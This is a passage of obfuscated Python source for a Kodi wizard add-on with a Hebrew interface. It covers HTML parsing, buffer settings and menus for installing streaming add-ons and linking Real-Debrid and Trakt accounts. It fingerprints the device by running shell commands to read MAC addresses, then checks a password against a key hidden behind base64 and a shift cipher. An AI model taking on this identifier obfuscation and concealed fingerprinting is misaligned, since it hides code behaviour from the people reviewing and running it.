				O0OO0O0OO0OO00000 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO00OOOOO0O00O00 )#line:1677
		if isinstance (ret ,str ):#line:1679
			OOO0OOO0OOO0OO0O0 =[]#line:1680
			for OO0O0O00000O0O00O in O0OO0O0OO0OO00000 :#line:1681
				O0O0OO0000O000O00 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O0O00000O0O00O )#line:1682
				if len (O0O0OO0000O000O00 )==0 :#line:1683
					O0O0OO0000O000O00 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O0O00000O0O00O )#line:1684
				for OO0000O00O0000OOO in O0O0OO0000O000O00 :#line:1685
					OO00OO00O00OOOOO0 =OO0000O00O0000OOO [0 ]#line:1686
					if OO00OO00O00OOOOO0 in "'\"":#line:1687
						if OO0000O00O0000OOO .find ('='+OO00OO00O00OOOOO0 ,OO0000O00O0000OOO .find (OO00OO00O00OOOOO0 ,1 ))>-1 :#line:1688
							OO0000O00O0000OOO =OO0000O00O0000OOO [:OO0000O00O0000OOO .find ('='+OO00OO00O00OOOOO0 ,OO0000O00O0000OOO .find (OO00OO00O00OOOOO0 ,1 ))]#line:1689
						if OO0000O00O0000OOO .rfind (OO00OO00O00OOOOO0 ,1 )>-1 :#line:1691
							OO0000O00O0000OOO =OO0000O00O0000OOO [1 :OO0000O00O0000OOO .rfind (OO00OO00O00OOOOO0 )]#line:1692
					else :#line:1693
						if OO0000O00O0000OOO .find (" ")>0 :#line:1694
							OO0000O00O0000OOO =OO0000O00O0000OOO [:OO0000O00O0000OOO .find (" ")]#line:1695
						elif OO0000O00O0000OOO .find ("/")>0 :#line:1696
							OO0000O00O0000OOO =OO0000O00O0000OOO [:OO0000O00O0000OOO .find ("/")]#line:1697
						elif OO0000O00O0000OOO .find (">")>0 :#line:1698
							OO0000O00O0000OOO =OO0000O00O0000OOO [:OO0000O00O0000OOO .find (">")]#line:1699
					OOO0OOO0OOO0OO0O0 .append (OO0000O00O0000OOO .strip ())#line:1701
			O0OO0O0OO0OO00000 =OOO0OOO0OOO0OO0O0 #line:1702
		else :#line:1703
			OOO0OOO0OOO0OO0O0 =[]#line:1704
			for OO0O0O00000O0O00O in O0OO0O0OO0OO00000 :#line:1705
				OOO0OOO0O0O00OO0O =u"</"+name #line:1706
				OO0000O0000OO00O0 =OOO00OOOOO0O00O00 .find (OO0O0O00000O0O00O )#line:1708
				O0000OO0O00OOOOOO =OOO00OOOOO0O00O00 .find (OOO0OOO0O0O00OO0O ,OO0000O0000OO00O0 )#line:1709
				OO00O00OO000OOOOO =OOO00OOOOO0O00O00 .find ("<"+name ,OO0000O0000OO00O0 +1 )#line:1710
				while OO00O00OO000OOOOO <O0000OO0O00OOOOOO and OO00O00OO000OOOOO !=-1 :#line:1712
					O0OOOOO000OOO00O0 =OOO00OOOOO0O00O00 .find (OOO0OOO0O0O00OO0O ,O0000OO0O00OOOOOO +len (OOO0OOO0O0O00OO0O ))#line:1713
					if O0OOOOO000OOO00O0 !=-1 :#line:1714
						O0000OO0O00OOOOOO =O0OOOOO000OOO00O0 #line:1715
					OO00O00OO000OOOOO =OOO00OOOOO0O00O00 .find ("<"+name ,OO00O00OO000OOOOO +1 )#line:1716
				if OO0000O0000OO00O0 ==-1 and O0000OO0O00OOOOOO ==-1 :#line:1718
					OO0OOO0O0OOOO0000 =u""#line:1719
				elif OO0000O0000OO00O0 >-1 and O0000OO0O00OOOOOO >-1 :#line:1720
					OO0OOO0O0OOOO0000 =OOO00OOOOO0O00O00 [OO0000O0000OO00O0 +len (OO0O0O00000O0O00O ):O0000OO0O00OOOOOO ]#line:1721
				elif O0000OO0O00OOOOOO >-1 :#line:1722
					OO0OOO0O0OOOO0000 =OOO00OOOOO0O00O00 [:O0000OO0O00OOOOOO ]#line:1723
				elif OO0000O0000OO00O0 >-1 :#line:1724
					OO0OOO0O0OOOO0000 =OOO00OOOOO0O00O00 [OO0000O0000OO00O0 +len (OO0O0O00000O0O00O ):]#line:1725
				if ret :#line:1727
					OOO0OOO0O0O00OO0O =OOO00OOOOO0O00O00 [O0000OO0O00OOOOOO :OOO00OOOOO0O00O00 .find (">",OOO00OOOOO0O00O00 .find (OOO0OOO0O0O00OO0O ))+1 ]#line:1728
					OO0OOO0O0OOOO0000 =OO0O0O00000O0O00O +OO0OOO0O0OOOO0000 +OOO0OOO0O0O00OO0O #line:1729
				OOO00OOOOO0O00O00 =OOO00OOOOO0O00O00 [OOO00OOOOO0O00O00 .find (OO0OOO0O0OOOO0000 ,OOO00OOOOO0O00O00 .find (OO0O0O00000O0O00O ))+len (OO0OOO0O0OOOO0000 ):]#line:1731
				OOO0OOO0OOO0OO0O0 .append (OO0OOO0O0OOOO0000 )#line:1732
			O0OO0O0OO0OO00000 =OOO0OOO0OOO0OO0O0 #line:1733
		OOOO0O00OOOOOO0O0 +=O0OO0O0OO0OO00000 #line:1734
	return OOOO0O00OOOOOO0O0 #line:1736
def addItem (O0OO0O0O0OO0O0O00 ,O0OOO00OO00O000O0 ,OO0OOOOOO000OOO00 ,OO0O0O00O00OO0O00 ,OO0O00O0000OOOOOO ,description =None ):#line:1738
	if description ==None :description =''#line:1739
	description ='[COLOR white]'+description +'[/COLOR]'#line:1740
	OOOOOOO0O0O0000OO =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OOO00OO00O000O0 )+"&mode="+str (OO0OOOOOO000OOO00 )+"&name="+urllib .quote_plus (O0OO0O0O0OO0O0O00 )+"&iconimage="+urllib .quote_plus (OO0O0O00O00OO0O00 )+"&fanart="+urllib .quote_plus (OO0O00O0000OOOOOO )#line:1741
	O0O0OOOOO0OO0O0O0 =True #line:1742
	O0OOO0O00O0000OO0 =xbmcgui .ListItem (O0OO0O0O0OO0O0O00 ,iconImage =OO0O0O00O00OO0O00 ,thumbnailImage =OO0O0O00O00OO0O00 )#line:1743
	O0OOO0O00O0000OO0 .setInfo (type ="Video",infoLabels ={"Title":O0OO0O0O0OO0O0O00 ,"Plot":description })#line:1744
	O0OOO0O00O0000OO0 .setProperty ("fanart_Image",OO0O00O0000OOOOOO )#line:1745
	O0OOO0O00O0000OO0 .setProperty ("icon_Image",OO0O0O00O00OO0O00 )#line:1746
	O0O0OOOOO0OO0O0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOOOOOO0O0O0000OO ,listitem =O0OOO0O00O0000OO0 ,isFolder =False )#line:1747
	return O0O0OOOOO0OO0O0O0 #line:1748
def get_params ():#line:1750
		O00OOOO0O00OOOO00 =[]#line:1751
		O00OOO000OOO0O0OO =sys .argv [2 ]#line:1752
		if len (O00OOO000OOO0O0OO )>=2 :#line:1753
				OOO0O00O0O0OOOOOO =sys .argv [2 ]#line:1754
				O00000OOO00O000OO =OOO0O00O0O0OOOOOO .replace ('?','')#line:1755
				if (OOO0O00O0O0OOOOOO [len (OOO0O00O0O0OOOOOO )-1 ]=='/'):#line:1756
						OOO0O00O0O0OOOOOO =OOO0O00O0O0OOOOOO [0 :len (OOO0O00O0O0OOOOOO )-2 ]#line:1757
				OO0O0OO00OOOOOOOO =O00000OOO00O000OO .split ('&')#line:1758
				O00OOOO0O00OOOO00 ={}#line:1759
				for O0OO000O0000O0O0O in range (len (OO0O0OO00OOOOOOOO )):#line:1760
						OO0OOOO000OOO00OO ={}#line:1761
						OO0OOOO000OOO00OO =OO0O0OO00OOOOOOOO [O0OO000O0000O0O0O ].split ('=')#line:1762
						if (len (OO0OOOO000OOO00OO ))==2 :#line:1763
								O00OOOO0O00OOOO00 [OO0OOOO000OOO00OO [0 ]]=OO0OOOO000OOO00OO [1 ]#line:1764
		return O00OOOO0O00OOOO00 #line:1766
def decode (OOO00O00O0O0O0O0O ,O00OOO0OOOOO0O0OO ):#line:1771
    import base64 #line:1772
    O00OO0000O0O0O0O0 =[]#line:1773
    if (len (OOO00O00O0O0O0O0O ))!=4 :#line:1775
     return 10 #line:1776
    O00OOO0OOOOO0O0OO =base64 .urlsafe_b64decode (O00OOO0OOOOO0O0OO )#line:1777
    for O00OO0OOO0OOOOOOO in range (len (O00OOO0OOOOO0O0OO )):#line:1779
        OO000O0OO0O0OOOO0 =OOO00O00O0O0O0O0O [O00OO0OOO0OOOOOOO %len (OOO00O00O0O0O0O0O )]#line:1780
        OOOO0O000O00O0OOO =chr ((256 +ord (O00OOO0OOOOO0O0OO [O00OO0OOO0OOOOOOO ])-ord (OO000O0OO0O0OOOO0 ))%256 )#line:1781
        O00OO0000O0O0O0O0 .append (OOOO0O000O00O0OOO )#line:1782
    return "".join (O00OO0000O0O0O0O0 )#line:1783
def tmdb_list (OOOOO0O0OO0OOO000 ):#line:1784
    OOOO0000O0O00O00O =decode ("7643",OOOOO0O0OO0OOO000 )#line:1787
    return int (OOOO0000O0O00O00O )#line:1790
def u_list (O00OOO00OOOOOOOO0 ):#line:1791
    from math import sqrt #line:1793
    O000O000OOO0OO0O0 =tmdb_list (TMDB_NEW_API )#line:1794
    O00O00000000OOOOO =str ((getHwAddr ('eth0'))*O000O000OOO0OO0O0 )#line:1796
    O0OOO00OO0000OOOO =int (O00O00000000OOOOO [1 ]+O00O00000000OOOOO [2 ]+O00O00000000OOOOO [5 ]+O00O00000000OOOOO [7 ])#line:1797
    O000OO00O0000O00O =(ADDON .getSetting ("pass"))#line:1799
    OO0000O0OOO000OOO =(str (round (sqrt ((O0OOO00OO0000OOOO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1804
    if '.'in OO0000O0OOO000OOO :#line:1805
     OO0000O0OOO000OOO =(str (round (sqrt ((O0OOO00OO0000OOOO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1806
    if O000OO00O0000O00O ==OO0000O0OOO000OOO :#line:1808
      O000OO0000OOOO0O0 =O00OOO00OOOOOOOO0 #line:1810
    else :#line:1812
       if STARTP2 ()and STARTP ()=='ok':#line:1813
         return O00OOO00OOOOOOOO0 #line:1816
       O000OO0000OOOO0O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1817
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1818
       sys .exit ()#line:1819
    return O000OO0000OOOO0O0 #line:1820
def disply_hwr ():#line:1823
   try :#line:1824
    OOO000OO00OOOOOOO =tmdb_list (TMDB_NEW_API )#line:1825
    OOOOO00O0000000OO =str ((getHwAddr ('eth0'))*OOO000OO00OOOOOOO )#line:1826
    O00O0O0O0OOOOO0O0 =(OOOOO00O0000000OO [1 ]+OOOOO00O0000000OO [2 ]+OOOOO00O0000000OO [5 ]+OOOOO00O0000000OO [7 ])#line:1833
    OOOOOOOO00O000O00 =(ADDON .getSetting ("action"))#line:1834
    wiz .setS ('action',str (O00O0O0O0OOOOO0O0 ))#line:1836
   except :pass #line:1837
def disply_hwr2 ():#line:1838
   try :#line:1839
    O0000000OO00OOO0O =tmdb_list (TMDB_NEW_API )#line:1840
    OO000OOOOO000OO00 =str ((getHwAddr ('eth0'))*O0000000OO00OOO0O )#line:1842
    O00000O000O0OO00O =(OO000OOOOO000OO00 [1 ]+OO000OOOOO000OO00 [2 ]+OO000OOOOO000OO00 [5 ]+OO000OOOOO000OO00 [7 ])#line:1851
    O000OO00OO0O000OO =(ADDON .getSetting ("action"))#line:1852
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00000O000O0OO00O )#line:1855
   except :pass #line:1856
def getHwAddr (OO00OOOO0OO000OOO ):#line:1858
   import subprocess ,time #line:1859
   OO0000O0OOOO00OOO ='windows'#line:1860
   if xbmc .getCondVisibility ('system.platform.android'):#line:1861
       OO0000O0OOOO00OOO ='android'#line:1862
   if xbmc .getCondVisibility ('system.platform.android'):#line:1863
     O00O00000OOOO00OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1864
     OO00O00OO0OOO000O =re .compile ('link/ether (.+?) brd').findall (str (O00O00000OOOO00OO ))#line:1866
     OO000OO000OOOOOO0 =0 #line:1867
     for O0O0OOOO0OOO0OO00 in OO00O00OO0OOO000O :#line:1868
      if OO00O00OO0OOO000O !='00:00:00:00:00:00':#line:1869
          OO00000O000OOO0O0 =O0O0OOOO0OOO0OO00 #line:1870
          OO000OO000OOOOOO0 =OO000OO000OOOOOO0 +int (OO00000O000OOO0O0 .replace (':',''),16 )#line:1871
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1873
       OO0OO0O00O0OOOO00 =0 #line:1874
       OO000OO000OOOOOO0 =0 #line:1875
       O00OO00OO0O0O0000 =[]#line:1876
       O0000O0O0O00O0O0O =os .popen ("getmac").read ()#line:1877
       O0000O0O0O00O0O0O =O0000O0O0O00O0O0O .split ("\n")#line:1878
       for O0000O000O00OOO0O in O0000O0O0O00O0O0O :#line:1880
            OO000OO0O0O0OO0O0 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O0000O000O00OOO0O ,re .I )#line:1881
            if OO000OO0O0O0OO0O0 :#line:1882
                OO00O00OO0OOO000O =OO000OO0O0O0OO0O0 .group ().replace ('-',':')#line:1883
                O00OO00OO0O0O0000 .append (OO00O00OO0OOO000O )#line:1884
                OO000OO000OOOOOO0 =OO000OO000OOOOOO0 +int (OO00O00OO0OOO000O .replace (':',''),16 )#line:1887
   else :#line:1889
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1890
   try :#line:1907
    return OO000OO000OOOOOO0 #line:1908
   except :pass #line:1909
def getpass ():#line:1910
	disply_hwr2 ()#line:1912
def setpass ():#line:1913
    O000000OOO00OOO0O =xbmcgui .Dialog ()#line:1914
    O00000OOOOO0O0OO0 =''#line:1915
    OO00O0O0000O0OO0O =xbmc .Keyboard (O00000OOOOO0O0OO0 ,'הכנס סיסמה')#line:1917
    OO00O0O0000O0OO0O .doModal ()#line:1918
    if OO00O0O0000O0OO0O .isConfirmed ():#line:1919
           OO00O0O0000O0OO0O =OO00O0O0000O0OO0O .getText ()#line:1920
    wiz .setS ('pass',str (OO00O0O0000O0OO0O ))#line:1921
def setuname ():#line:1922
    O0O0OO0OOOOOOO0OO =''#line:1923
    O0OO0OO00OO00OOO0 =xbmc .Keyboard (O0O0OO0OOOOOOO0OO ,'הכנס שם משתמש')#line:1924
    O0OO0OO00OO00OOO0 .doModal ()#line:1925
    if O0OO0OO00OO00OOO0 .isConfirmed ():#line:1926
           O0O0OO0OOOOOOO0OO =O0OO0OO00OO00OOO0 .getText ()#line:1927
           wiz .setS ('user',str (O0O0OO0OOOOOOO0OO ))#line:1928
def powerkodi ():#line:1929
    os ._exit (1 )#line:1930
def buffer1 ():#line:1932
	OOO0O0O000O0OOO0O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1933
	O00OOO000OOOOO00O =xbmc .getInfoLabel ("System.Memory(total)")#line:1934
	OO0OO0OOO00OO00OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1935
	OOOO0000OOO0O0OOO =re .sub ('[^0-9]','',OO0OO0OOO00OO00OO )#line:1936
	OOOO0000OOO0O0OOO =int (OOOO0000OOO0O0OOO )/3 #line:1937
	OOOO00O0O00OOOO0O =OOOO0000OOO0O0OOO *1024 *1024 #line:1938
	try :O00OO0OOO0OOO0O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1939
	except :O00OO0OOO0OOO0O0O =16 #line:1940
	OO0O0O0OOOO0OO00O =DIALOG .yesno ('FREE MEMORY: '+str (OO0OO0OOO00OO00OO ),'Based on your free Memory your optimal buffersize is: '+str (OOOO0000OOO0O0OOO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1943
	if OO0O0O0OOOO0OO00O ==1 :#line:1944
		with open (OOO0O0O000O0OOO0O ,"w")as OOOOOOO000O0O00OO :#line:1945
			if O00OO0OOO0OOO0O0O >=17 :OOOOOOOOOO0O00O0O =xml_data_advSettings_New (str (OOOO00O0O00OOOO0O ))#line:1946
			else :OOOOOOOOOO0O00O0O =xml_data_advSettings_old (str (OOOO00O0O00OOOO0O ))#line:1947
			OOOOOOO000O0O00OO .write (OOOOOOOOOO0O00O0O )#line:1949
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO00O0O00OOOO0O ),'Please restart Kodi for settings to apply.','')#line:1950
	elif OO0O0O0OOOO0OO00O ==0 :#line:1952
		OOOO00O0O00OOOO0O =_O0OO0O000O00OOOOO (default =str (OOOO00O0O00OOOO0O ),heading ="INPUT BUFFER SIZE")#line:1953
		with open (OOO0O0O000O0OOO0O ,"w")as OOOOOOO000O0O00OO :#line:1954
			if O00OO0OOO0OOO0O0O >=17 :OOOOOOOOOO0O00O0O =xml_data_advSettings_New (str (OOOO00O0O00OOOO0O ))#line:1955
			else :OOOOOOOOOO0O00O0O =xml_data_advSettings_old (str (OOOO00O0O00OOOO0O ))#line:1956
			OOOOOOO000O0O00OO .write (OOOOOOOOOO0O00O0O )#line:1957
			DIALOG .ok ('Buffer Size Set to: '+str (OOOO00O0O00OOOO0O ),'Please restart Kodi for settings to apply.','')#line:1958
def xml_data_advSettings_old (OO0OOO00000OOOO0O ):#line:1959
	OOO0000O0OO000OO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OO0OOO00000OOOO0O #line:1969
	return OOO0000O0OO000OO0 #line:1970
def xml_data_advSettings_New (O0O0O00OOO0000O00 ):#line:1972
	O00O00OO00O0000O0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0O0O00OOO0000O00 #line:1984
	return O00O00OO00O0000O0 #line:1985
def write_ADV_SETTINGS_XML (O00000000O0000000 ):#line:1986
    if not os .path .exists (xml_file ):#line:1987
        with open (xml_file ,"w")as OOO00O00OOOOO0OOO :#line:1988
            OOO00O00OOOOO0OOO .write (xml_data )#line:1989
def _O0OO0O000O00OOOOO (default ="",heading ="",hidden =False ):#line:1990
    ""#line:1991
    O00OO00OOOOO0000O =xbmc .Keyboard (default ,heading ,hidden )#line:1992
    O00OO00OOOOO0000O .doModal ()#line:1993
    if (O00OO00OOOOO0000O .isConfirmed ()):#line:1994
        return unicode (O00OO00OOOOO0000O .getText (),"utf-8")#line:1995
    return default #line:1996
def index ():#line:1998
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1999
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2000
	if AUTOUPDATE =='Yes':#line:2001
		if wiz .workingURL (WIZARDFILE )==True :#line:2002
			O0O0OO0O0O00O0O0O =wiz .checkWizard ('version')#line:2003
			if O0O0OO0O0O00O0O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O0OO0O0O00O0O0O ),'wizardupdate',themeit =THEME2 )#line:2004
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2005
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2006
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2007
	if len (BUILDNAME )>0 :#line:2008
		O0000O0OOO0OO00O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2009
		O0OOOOOO00O0O0OO0 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2010
		if O0000O0OOO0OO00O0 >BUILDVERSION :O0OOOOOO00O0O0OO0 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0OOOOOO00O0O0OO0 ,O0000O0OOO0OO00O0 )#line:2011
		addDir (O0OOOOOO00O0O0OO0 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2013
		try :#line:2015
		     OOOO0OO00O000OOOO =wiz .themeCount (BUILDNAME )#line:2016
		except :#line:2017
		   OOOO0OO00O000OOOO =False #line:2018
		if not OOOO0OO00O000OOOO ==False :#line:2019
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2020
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2021
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2024
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2025
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2026
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2030
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2032
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2034
def morsetup ():#line:2036
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2037
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2038
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2039
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2040
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2041
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2045
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2046
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2049
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2050
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	setView ('files','viewType')#line:2061
def morsetup2 ():#line:2062
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2063
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2064
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2065
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2066
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2067
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2069
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2070
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2071
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2072
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2073
def fastupdate ():#line:2074
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2075
def forcefastupdate ():#line:2077
			OOO0OO00O0O000OO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2078
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0OO00O0O000OO0 )#line:2079
def rdsetup ():#line:2083
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2084
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2085
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2087
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2088
def traktsetup ():#line:2091
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2092
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2093
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2094
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2095
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2096
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2097
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2098
	setView ('files','viewType')#line:2099
def setautorealdebrid ():#line:2100
    from resources .libs import real_debrid #line:2101
    OOOO00O0OOOO0OO0O =real_debrid .RealDebridFirst ()#line:2102
    OOOO00O0OOOO0OO0O .auth ()#line:2103
def setrealdebrid ():#line:2105
    O0000OOO000OO0OO0 =(ADDON .getSetting ("auto_rd"))#line:2106
    if O0000OOO000OO0OO0 =='false':#line:2107
       ADDON .openSettings ()#line:2108
    else :#line:2109
        from resources .libs import real_debrid #line:2110
        O00O0000OO00O0000 =real_debrid .RealDebrid ()#line:2111
        O00O0000OO00O0000 .auth ()#line:2112
        rdon ()#line:2115
def resolveurlsetup ():#line:2117
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2118
def urlresolversetup ():#line:2119
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2120
def placentasetup ():#line:2122
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2123
def reptiliasetup ():#line:2124
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2125
def flixnetsetup ():#line:2126
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2127
def yodasetup ():#line:2128
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2129
def numberssetup ():#line:2130
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2131
def uranussetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2133
def genesissetup ():#line:2134
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2135
def net_tools (view =None ):#line:2137
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2138
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2139
	setView ('files','viewType')#line:2141
def speedMenu ():#line:2142
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2143
def viewIP ():#line:2144
	O00O00OO000000O0O =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2158
	OO0OOO0000O0O0000 =[];OO0O0O00000O0OOO0 =0 #line:2159
	for OO00O000O0O00OOO0 in O00O00OO000000O0O :#line:2160
		O000O0000OOOO0O0O =wiz .getInfo (OO00O000O0O00OOO0 )#line:2161
		O000O00000OO0O0OO =0 #line:2162
		while O000O0000OOOO0O0O =="Busy"and O000O00000OO0O0OO <10 :#line:2163
			O000O0000OOOO0O0O =wiz .getInfo (OO00O000O0O00OOO0 );O000O00000OO0O0OO +=1 ;wiz .log ("%s sleep %s"%(OO00O000O0O00OOO0 ,str (O000O00000OO0O0OO )));xbmc .sleep (1000 )#line:2164
		OO0OOO0000O0O0000 .append (O000O0000OOOO0O0O )#line:2165
		OO0O0O00000O0OOO0 +=1 #line:2166
	OOOOOOOOO0O000OO0 ,OOOO00OO000O00OO0 ,O00OO000OO00OOO0O =getIP ()#line:2167
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO0000O0O0000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2168
